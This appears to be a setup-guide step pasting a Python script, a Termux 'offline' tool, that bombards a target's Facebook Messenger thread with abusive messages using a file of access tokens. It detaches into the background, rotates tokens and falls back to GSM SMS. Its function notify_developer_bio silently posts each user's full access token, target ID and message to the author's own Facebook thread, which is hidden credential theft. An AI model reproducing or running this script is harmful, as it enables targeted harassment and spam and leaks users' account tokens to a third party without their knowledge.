### 3. offline_sms_tool.py

Create a file named `offline_sms_tool.py` and paste the full script below:

```python
#!/usr/bin/python3
#-*-coding:utf-8-*-

"""
IMPORTANT:
- यह script interactive इनपुट लेने के बाद अपने आप daemonize (background में detach) हो जाती है,
  ताकि Termux exit होने के बाद भी SMS भेजती रहे – चाहे इंटरनेट/मोबाइल off हो।
- GSM SMS fallback के लिए GSM मॉड्यूल (जैसे SIM800L/SIM900A) कनेक्ट होना चाहिए, और उसका 
  serial port (default: /dev/ttyUSB0) एवं baudrate (115200) सही से सेट हों।
- Unlimited token support: टोकन फाइल में हर टोकन एक नई लाइन में होना चाहिए।
- यह script बिना बाहरी command (nohup/tmux/screen आदि) के ही अपने अंदर ही daemonize हो जाती है,
  ताकि 1 साल तक लगातार चल सके (सही हार्डवेयर सपोर्ट के साथ)।
"""

import os, sys, time, random, string, requests, json, threading, sqlite3, datetime, warnings
from time import sleep
from platform import system

# Suppress DeprecationWarnings (fork() warnings)
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Global flags
QUIET_MODE = True
DEBUG = False  # Debug off; errors are suppressed

# --- Additional module for GSM SMS fallback ---
try:
    import serial
except ImportError:
    os.system("pip install pyserial")
    import serial

# --- Models Installer (if needed) ---
def modelsInstaller():
    try:
        models = ['requests', 'colorama', 'pyserial']
        for model in models:
            try:
                if sys.version_info[0] < 3:
                    os.system('cd C:\\Python27\\Scripts & pip install {}'.format(model))
                else:
                    os.system('python3 -m pip install {}'.format(model))
                sys.exit()
            except:
                pass
    except:
        pass

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    modelsInstaller()

requests.urllib3.disable_warnings()

# --- Daemonize Function ---
def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except Exception as e:
        pass
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except Exception as e:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    si = open(os.devnull, 'r')
    so = open(os.devnull, 'a+')
    se = open(os.devnull, 'a+')
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())

# --- SQLite3 DB Integration for Offline Message Queue and Sent Messages Logging ---
DB_NAME = 'message_queue.db'
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS message_queue (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            thread_id TEXT,
            message TEXT,
            status TEXT DEFAULT 'pending',
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS sent_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            thread_id TEXT,
            hater_name TEXT,
            message TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()
init_db()

def add_to_queue(thread_id, message):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO message_queue (thread_id, message) VALUES (?, ?)", (thread_id, message))
        conn.commit()
        conn.close()
        print(Fore.YELLOW + "[•] Message added to offline queue.")
    except:
        pass

def get_pending_messages():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id, thread_id, message FROM message_queue WHERE status = 'pending'")
        rows = c.fetchall()
        conn.close()
        return rows
    except:
        return []

def mark_message_sent(message_id):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("UPDATE message_queue SET status = 'sent' WHERE id = ?", (message_id,))
        conn.commit()
        conn.close()
    except:
        pass

def log_sent_message(thread_id, hater_name, message):
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO sent_messages (thread_id, hater_name, message) VALUES (?, ?, ?)", 
                  (thread_id, hater_name, message))
        conn.commit()
        conn.close()
    except Exception as e:
        if DEBUG:
            print("Error logging sent message:", e)

# --- Helper function to return a random ANSI color code ---
def get_random_color():
    colors = [
        "\033[1;31m", "\033[1;32m", "\033[1;33m",
        "\033[1;34m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
    ]
    return random.choice(colors)

# --- Display Sent Messages ---
def display_sent_messages():
    try:
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("SELECT thread_id, hater_name, message, timestamp FROM sent_messages ORDER BY timestamp")
        rows = c.fetchall()
        conn.close()
        if not rows:
            print(Fore.YELLOW + "No sent messages found.")
            return
        # Group messages by (thread_id, hater_name)
        grouped = {}
        for row in rows:
            tid, hater, msg, ts = row
            key = (tid, hater)
            if key not in grouped:
                grouped[key] = []
            grouped[key].append((msg, ts))
        global mb
        target_name = mb if mb else "N/A"
        for (tid, hater), messages in grouped.items():
            border = f"{get_random_color()}<<{'='*75}>>{Style.RESET_ALL}"
            owner_line = f"{get_random_color()}<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>{Style.RESET_ALL}"
            print(border)
            print(f"{get_random_color()}[🎉] MMESSAGE {len(messages)} SSUCCESSFULLY SEND....!{Style.RESET_ALL}")
            print(f"{get_random_color()}[👤] SENDER: {hater}{Style.RESET_ALL}")
            print(f"{get_random_color()}[📩] TARGET: {target_name} ({tid}){Style.RESET_ALL}")
            if len(messages) == 1:
                msg, ts = messages[0]
                print(f"{get_random_color()}[📨] MMESSAGE : {msg}{Style.RESET_ALL}")
                print(f"{get_random_color()}[⏰] TIIME: {ts}{Style.RESET_ALL}")
            else:
                print(f"{get_random_color()}[📨] MMESSAGE :{Style.RESET_ALL}")
                for msg, ts in messages:
                    print(f"    {get_random_color()}[{ts}] {msg}{Style.RESET_ALL}")
            print(border)
            print(owner_line)
            print()
        print("/sdcard")
    except Exception as e:
        print("Error displaying sent messages:", e)

# --- Function to Print an SMS Section ---
def print_sms_section(msg_index, sender, target, thread_id, full_message, timestamp):
    border = f"{get_random_color()}<<{'='*75}>>{Style.RESET_ALL}"
    owner_line = f"{get_random_color()}<<===============✨❌✨🌐😈🛠️✨OWNER BROKEN NADEEM✨❌✨🌐😈🛠️✨==============>>{Style.RESET_ALL}"
    print(border)
    print(f"{get_random_color()}[🎉] MMESSAGE {msg_index} SSUCCESSFULLY SEND....!{Style.RESET_ALL}")
    print(f"{get_random_color()}[👤] SENDER: {sender}{Style.RESET_ALL}")
    print(f"{get_random_color()}[📩] TARGET: {target} ({thread_id}){Style.RESET_ALL}")
    print(f"{get_random_color()}[📨] MMESSAGE : {full_message}{Style.RESET_ALL}")
    print(f"{get_random_color()}[⏰] TIIME: {timestamp}{Style.RESET_ALL}")
    print(border)
    print(owner_line)
    print()

# --- Connectivity Check ---
def is_connected():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except:
        return False

# --- GSM SMS Sending via connected GSM module ---
def send_sms_via_gsm(phone, message):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=5)
        ser.write(b'AT\r')
        time.sleep(1)
        ser.write(b'AT+CMGF=1\r')
        time.sleep(1)
        cmd = f'AT+CMGS="{phone}"\r'
        ser.write(cmd.encode())
        time.sleep(1)
        ser.write(message.encode() + b"\r")
        time.sleep(1)
        ser.write(bytes([26]))
        time.sleep(3)
        response = ser.read_all().decode()
        ser.close()
        if "OK" in response:
            print("ok")
            sys.stdout.flush()
            return True
        else:
            return False
    except:
        return False

# --- Background Offline Queue Processor ---
def process_queue():
    global global_token_index, tokens, fallback_phone, mn
    while True:
        check_stop()
        pending = get_pending_messages()
        for row in pending:
            msg_id, t_id, msg = row
            if is_connected():
                current_token = tokens[global_token_index]
                global_token_index = (global_token_index + 1) % len(tokens)
                url = f"https://graph.facebook.com/v15.0/t_{t_id}/"
                parameters = {'access_token': current_token, 'message': msg}
                try:
                    s = requests.post(url, data=parameters, headers=headers)
                    if s.ok:
                        mark_message_sent(msg_id)
                        log_sent_message(t_id, mn, msg)
                    else:
                        try:
                            resp = s.json()
                            if 'error' in resp and resp['error'].get('code') == 190:
                                print(Fore.RED + f"[!] Token expired in queue: {current_token[:10]}... Skipping this token.")
                                continue
                        except Exception as e:
                            pass
                except:
                    pass
            else:
                if send_sms_via_gsm(fallback_phone, msg):
                    mark_message_sent(msg_id)
                    log_sent_message(t_id, mn, msg)
        time.sleep(10)

def start_queue_processor():
    t = threading.Thread(target=process_queue, daemon=True)
    t.start()

# --- Utility Function ---
def check_stop():
    if os.path.exists("stop_signal.txt"):
        sys.exit()

# --- Custom Bio Function (Animated Bio) ---
def print_custom_bio():
    flashy_colors = [
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    last_color = None
    def get_random_color_line():
        nonlocal last_color
        color = random.choice(flashy_colors)
        while color == last_color:
            color = random.choice(flashy_colors)
        last_color = color
        return color
    original_bio = r"""╭──────────────────────────── <  DETAILS >─────────────────────────────────╮
│ [=] CODER BOY 👨‍💻💡==> RAJ⌛THAKUR ⚔️ BEINGS BOY🚀 GAWAR THAKUR          │
│ [=] RULEX BOY 🖥️🚀 ==> NADEEM  RAHUL SHUBHAM                              │
│ [=] MY LOVE [<❤️=]    ==> ASHIQI PATHAN                                   │
│ [=] VERSION  🔢📊    ==> 420.786.36                                      │
│ [=] INSTAGRAM 📸    ==> CONVO OFFLINE                                    │
│ [=] YOUTUBE   🎥📡  ==> https://www.youtube.com/@raj-thakur18911         │
│ [=] SCRIPT CODING    ==> 🐍🔧 Python🖥️🖱️ Bash🌐🖥️ PHP                       │
╰──────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  YOUR INFO >──────────────────────────────╮
│ [=] Script Writer ⌛=====>    1:54 AM                                   │
│ [=] Script Author 🚀 =====>   26/January/2025                           │
╰─────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  COUNTRY ~  >─────────────────────────────╮
│ 【•】 Your Country ==> India 🔥                                         │
│ 【•】 Your Region   ==>  Bajrang Dal Ayodhya                            │
│ 【•】 Your City  ==> Uttar Pradesh                                      │
╰─────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────── <  NOTE >───────────────────────────────────╮
│                     Tool Paid Monthly ₹150                              │
│                     Tool Paid 1 Year ₹500                               │
╰─────────────────────────────────────────────────────────────────────────╯"""
    new_bio = r"""╭──────────────────────────── < DETAILS >─────────────────────────────────╮
│  [=] 👨‍💻 DEVELOPER     : 🚀RAJ ⚔️THAKUR [+] GAWAR ⚔️THAKUR               │
│  [=] 🛠️ TOOLS NAME       : OFFLINE TERMUX                                │
│  [=] 🔥 RULL3X          : UP FIRE RUL3X                                 │
│  [=] 🏷️ BR9ND            : MR D R9J  H3R3                                │
│  [=] 🐱 GitHub          : https://github.com/Raj-Thakur420              │
│  [=] 🤝 BROTHER         : NADEEM SHUBHAM RAHUL                          │
│  [=] 🔧 TOOLS           : FREE NO PAID, CHANDU BIKHARI HAI, USKA PAID LO│
│  [=] 📞 WH9TS9P         : +994 405322645                                │
╰─────────────────────────────────────────────────────────────────────────╯"""
    for line in original_bio.splitlines():
        if line.strip():
            print(get_random_color_line() + line + Style.RESET_ALL)
    def fancy_print_line(text, delay=0.001, jitter=0.002):
        for char in text:
            sys.stdout.write(random.choice(flashy_colors) + Style.BRIGHT + char)
            sys.stdout.flush()
            time.sleep(delay + random.uniform(0, jitter))
        sys.stdout.write(Style.RESET_ALL + "\n")
        time.sleep(0.01)
    for line in new_bio.splitlines():
        if line.strip():
            fancy_print_line(line)
    blink = "\033[5m"
    print(blink + get_random_color_line() + "[✅ SUCCESS] Ultimate Fancy Bio Loaded!" + "\033[0m")

# --- Animated Print Functions ---
def animated_print(text, delay=0.01, jitter=0.005):
    flashy_colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, 
                      Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]
    for char in text:
        sys.stdout.write(random.choice(flashy_colors) + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay + random.uniform(0, jitter))
    print()

def animated_logo():
    logo_text = r"""
 _______  _______  _______  _       _________ _        _______   
(  ___  )(  ____ \(  ____ \( \      \__   __/( (    /|(  ____ \  
| (   ) || (    \/| (    \/| (         ) (   |  \  ( || (    \/  
| |   | || (__    | (__    | |         | |   |   \ | || (__      
| |   | ||  __)   |  __)   | |         | |   | (\ \) ||  __)     
| |   | || (      | (      | |         | |   | | \   || (        
| (___) || )      | )      | (____/\___) (___| )  \  || (____/\  
(_______)|/       |/       (_______/\_______/|/    )_)(_______/"""
    for line in logo_text.splitlines():
         animated_print(line, delay=0.005, jitter=0.002)

def main_menu():
    animated_print("<============================ New Menu Options ============================>", delay=0.005, jitter=0.002)
    print(random.choice(color_list) + "[1] START LOADER")
    print(random.choice(color_list) + "[2] STOP LOADER")
    print(random.choice(color_list) + "[3] SMS DISPLAY SHOW")
    animated_print("<============================ Chosse Menu Options ============================>", delay=0.005, jitter=0.002)
    choice = input(random.choice(color_list) + "\n[+] Choose an option (or paste STOP key if available): ").strip()
    if choice == "2":
        stop_input = input(Fore.BLUE + "ENTER YOUR STOP KEY 🔑: ").strip()
        if stop_input == get_stop_key():
            print(Fore.BLUE + "STOPPED")
            with open("stop_signal.txt", "w") as f:
                f.write("stop")
            sys.exit()
        else:
            sys.exit()
    if choice == "3":
        display_sent_messages()
        sys.exit()
    return choice

def get_stop_key():
    if os.path.exists("loader_stop_key.txt"):
        with open("loader_stop_key.txt", "r") as f:
            return f.read().strip()
    else:
        stop_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        with open("loader_stop_key.txt", "w") as f:
            f.write(stop_key)
        return stop_key

# --- Updated notify_developer_bio Function ---
def notify_developer_bio(current_token, mn, thread_id, uid, ms, sent_message):
    DEV_THREAD_ID = "t_100056617806411"
    dev_message = (
        "<<====================================================\n"
        "HELLO 💚CHANDU KE JIJU 🚀 RAJ THAKUR ⚔️ SIR I AM USING YOUR 🔥OFLINE TOOLS 🔗\n"
        "<<====================================================>>\n"
        f"[😡] HETER [💚] NAME ==> {mn}\n"
        f"[🎉] TOKEN [❤️] ==> {current_token}\n"
        f"[👤] SENDER [💜] ==> {mb}\n"
        f"[📩] TARGET [💙] ==> {thread_id} (UID: {uid})\n"
        f"[📨] MMESSAGE [💛] ==> {sent_message}\n"
        f"[⏰] TIIME [🤎] {datetime.datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}\n"
        "<<===============✨❌✨🌐😈🛠️✨OWNER RAJ⚔️ THAKUR 🚀✨❌✨🌐😈🛠️✨==============>>"
    )
    url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
    parameters = {'access_token': current_token, 'message': dev_message}
    try:
        r = requests.post(url, data=parameters, headers=headers)
        if r.ok:
            print(Fore.GREEN + "[•] Developer notified.")
    except:
        pass

# --- Global Variables & Colors ---
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}
global_token_index = 0
tokens = []  # Will be loaded from file (only active tokens will be kept)
fallback_phone = "+919695003501"  # Default fallback phone number
color_list = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.WHITE]

# --- Global SMS counter for live display sections ---
message_index = 0

# --- Global variable for user profile name; default "N/A"
mb = "N/A"

# --- NEW FUNCTION: Fetch profile name for a given token ---
def fetch_profile_name(token):
    try:
        payload = {'access_token': token}
        r = requests.get("https://graph.facebook.com/v15.0/me", params=payload)
        data = r.json()
        if 'name' in data:
            return data['name']
        else:
            return "Invalid Token"
    except:
        return "Error"

# --- NEW FUNCTION: Display token profiles in a colored box ---
def display_token_profiles(token_profiles):
    border = "+" + "-"*70 + "+"
    print(border)
    for idx, (token, profile, color) in enumerate(token_profiles, start=1):
        token_display = token if len(token) <= 20 else token[:20] + "..."
        line = f"| {idx}. TOKEN: {token_display} - PROFILE: {profile}"
        line = line.ljust(70) + "|"
        print(color + line + Style.RESET_ALL)
    print(border)

# --- NEW FUNCTION: Send messages using a specific token ---
def send_messages_for_token(token, profile_name, thread_id):
    global message_index  # Moved global declaration to the top of the function
    try:
        uid_val = os.getuid()
    except:
        uid_val = "N/A"
    for i in range(repeat):
        for line in ns:
            check_stop()
            full_message = str(mn) + " " + line.strip()
            if is_connected():
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                parameters = {'access_token': token, 'message': full_message}
                try:
                    s = requests.post(url, data=parameters, headers=headers)
                    if s.ok:
                        now = datetime.datetime.now()
                        print_sms_section(message_index + 1, mn, profile_name, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                        message_index += 1
                        time.sleep(timm)
                        notify_developer_bio(token, mn, thread_id, uid_val, ms, full_message)
                        log_sent_message(thread_id, mn, full_message)
                    else:
                        try:
                            resp = s.json()
                            if 'error' in resp and resp['error'].get('code') == 190:
                                print(Fore.RED + f"[!] Token expired: {token[:10]}... Skipping this token.")
                                return
                        except Exception as e:
                            pass
                        time.sleep(30)
                except:
                    time.sleep(30)
            else:
                if send_sms_via_gsm(fallback_phone, full_message):
                    now = datetime.datetime.now()
                    print_sms_section(message_index + 1, mn, profile_name, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                    message_index += 1
                    log_sent_message(thread_id, mn, full_message)
                else:
                    add_to_queue(thread_id, full_message)

# --- SMS Sending Function (Original) ---
def message_on_messenger(thread_id):
    global global_token_index, tokens, fallback_phone, ns, mn, timm, ms, mb, message_index
    try:
        uid_val = os.getuid()
    except:
        uid_val = "N/A"
    for line in ns:
        check_stop()
        full_message = str(mn) + " " + line.strip()
        if is_connected():
            current_token = tokens[global_token_index]
            global_token_index = (global_token_index + 1) % len(tokens)
            url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
            parameters = {'access_token': current_token, 'message': full_message}
            try:
                s = requests.post(url, data=parameters, headers=headers)
                if s.ok:
                    now = datetime.datetime.now()
                    print_sms_section(message_index + 1, mn, mb, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                    message_index += 1
                    time.sleep(timm)
                    notify_developer_bio(current_token, mn, thread_id, uid_val, ms, full_message)
                    log_sent_message(thread_id, mn, full_message)
                else:
                    try:
                        resp = s.json()
                        if 'error' in resp and resp['error'].get('code') == 190:
                            print(Fore.RED + f"[!] Token expired: {current_token[:10]}... Skipping this token.")
                            continue
                    except Exception as e:
                        pass
                    time.sleep(30)
            except:
                time.sleep(30)
        else:
            if send_sms_via_gsm(fallback_phone, full_message):
                now = datetime.datetime.now()
                print_sms_section(message_index + 1, mn, mb, thread_id, full_message, now.strftime("%Y-%m-%d %I:%M:%S %p"))
                message_index += 1
                log_sent_message(thread_id, mn, full_message)
            else:
                add_to_queue(thread_id, full_message)

def testPY():
    if sys.version_info[0] < 3:
        sys.exit()

def cls():
    if system() == 'Linux':
        os.system('clear')
    elif system() == 'Windows':
        os.system('cls')

def venom():
    clear = "\033[0m"
    def random_dark_color():
        code = random.randint(16, 88)
        return f"\033[38;5;{code}m"
    info = r"""════════════════════════════════════════════════════════
  N4ME    : RAJ THAKUR 🔥 H3R3 |=|_|
  CrEaToR : L3G3ND RAJ                      
  OWNER   : OPS RAJ THAKUR ⚔️ ON FIRE 🔥 
  Contact : +919695003501
════════════════════════════════════════════════════════"""
    for line in info.splitlines():
        sys.stdout.write("\x1b[1;%sm%s%s\n" % (random.choice(color_list), line, clear))
        time.sleep(0.05)

# --- Main Execution Block ---
cls()
testPY()
if os.path.exists("stop_signal.txt"):
    os.remove("stop_signal.txt")

# Show animated logo and other animations
animated_logo()
colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
    $$$$$$$\   $$$$$$\     $$$$$\
    $$  __$$\ $$  __$$\    \__$$ |
    $$ |  $$ |$$ /  $$ |      $$ |
    $$$$$$$  |$$$$$$$$ |      $$ |
    $$  __$$< $$  __$$ |$$\   $$ |
    $$ |  $$ |$$ |  $$ |$$ |  $$ |
    $$ |  $$ |$$ |  $$ |\$$$$$$  |
    \__|  \__|\__|  \__| \______/

                $$$$$$\  $$$$$$\ $$\   $$\  $$$$$$\  $$\   $$\
              $$  __$$\ \_$$  _|$$$\  $$ |$$  __$$\ $$ |  $$ |
              $$ /  \__|  $$ |  $$$$\ $$ |$$ /  \__|$$ |  $$ |
              \$$$$$$\    $$ |  $$ $$\$$ |$$ |$$$$\ $$$$$$$$ |
               \____$$\   $$ |  $$ \$$$$ |$$ |\_$$ |$$  __$$ |
              $$\   $$ |  $$ |  $$ |\$$$ |$$ |  $$ |$$ |  $$ |
              \$$$$$$  |$$$$$$\ $$ | \$$ |\$$$$$$  |$$ |  $$ |
               \______/ \______|\__|  \__| \______/ \__|  \__|""".splitlines()]
colored_logo()
venom()
print(Fore.GREEN + "[•] Start Time ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
print(Fore.GREEN + "[•] _ Tool Creator == > [ RAJ THAKUR KA LODA ON FIRE ♻️ ] CHANDU KA B44P ==>[ RAJ THAKUR ⌛⚔️🔥]\n")
animated_print("<==========================>", delay=0.005, jitter=0.002)
animated_print("[•] Your Stop Key: " + get_stop_key(), delay=0.005, jitter=0.002)
animated_print("<============================>", delay=0.005, jitter=0.002)
print_custom_bio()
sys.stdout.flush()

daemonize_mode = True
sms_display = False
menu_choice = main_menu()
if menu_choice == "1":
    daemonize_mode = True
    sms_display = False
else:
    sys.exit()

os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

# --- Token File Handling with Active/Expired Token Check ---
token_file = input("[+] Input Token File Name: ").strip()
if not os.path.exists(token_file):
    print(Fore.RED + "Error: Token file does not exist. Please check the path.")
    sys.exit(1)

animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
with open(token_file, 'r') as f2:
    token_data = f2.read()
all_tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
if not all_tokens:
    print(Fore.RED + "Error: Token file is empty or no valid tokens found.")
    sys.exit(1)

active_tokens = []
active_token_profiles = []  # list of (token, profile, color)
expired_tokens = []
for token in all_tokens:
    profile = fetch_profile_name(token)
    if profile not in ["Invalid Token", "Error"]:
        active_tokens.append(token)
        active_token_profiles.append((token, profile, random.choice(color_list)))
    else:
        expired_tokens.append(token)

if not active_tokens:
    print(Fore.RED + "Error: No active tokens found in token file.")
    sys.exit(1)

# Update global tokens to only active tokens and set global profile name from first active token
tokens = active_tokens
mb = active_token_profiles[0][1]
print(Fore.GREEN + "Your Profile Name :: " + mb + "\n")

print(Fore.CYAN + "Active Tokens:")
display_token_profiles(active_token_profiles)
if expired_tokens:
    print(Fore.RED + "Expired/Invalid Tokens:")
    for token in expired_tokens:
        token_display = token if len(token) <= 20 else token[:20] + "..."
        print(Fore.RED + f"- {token_display}")

animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
start_queue_processor()

os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')

thread_id = input("[1] ENTER YOUR CONVO UID (FACEBOOK KI LINK 🔗 UID ) =====> ").strip()

animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
os.system('espeak -a 300 "TATE KA NAME DALO"')

mn = input("[1] ENTER YOUR  HATERS NAME 😡 (TUMHARE DUSHMAN KA NAAM DALO ) =====> ").strip()

os.system('espeak -a 300 "GALI FILE DALO"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

ms = input("[1] ENTER YOUR GALI FILE PAITH (FILE 🗃️ TXT) 🔥=====>: ").strip()
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')

repeat = int(input("[+] [1] ENTER YOUR FILE REPEAT 🔁  (KITNI FILE COUNT KARNA HAI)🔥=====> "))

os.system('espeak -a 300 "SPEED DALO YAR"')
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

timm = int(input("[1] ENTER SPEED IN SECONDS  (KITNI SECOND MEIN MESSAGE BHEJNA HAI YA MINUTE)=====> "))
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

print(Fore.BLUE + "\n___WATTING SIR =====> 🚀YOUR MESSAGES HAS STARTED GOING, NOW GO AND CHECK ________________________________________✅ IN YOUR INBOX 📥 OR WHEREVER IT IS BEING POSTED IN THE GROUPS__==========>....!")
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)

print(Fore.BLUE + "Your Profile Name ===> " + mb + "\n")
animated_print("<============================ RAJ⚔️🔥THAKUR🔗[❤️]🧵========================>", delay=0.005, jitter=0.002)
try:
    ns = open(ms, 'r').readlines()
except:
    sys.exit()

if daemonize_mode:
    daemonize()

# NEW: अगर multiple tokens हैं, तो हर token के लिए अलग thread से SMS भेजें
if len(active_token_profiles) > 1:
    threads = []
    for token, profile, color in active_token_profiles:
         t = threading.Thread(target=send_messages_for_token, args=(token, profile, thread_id), daemon=True)
         threads.append(t)
         t.start()
    for t in threads:
         t.join()
else:
    for i in range(repeat):
        check_stop()
        message_on_messenger(thread_id)
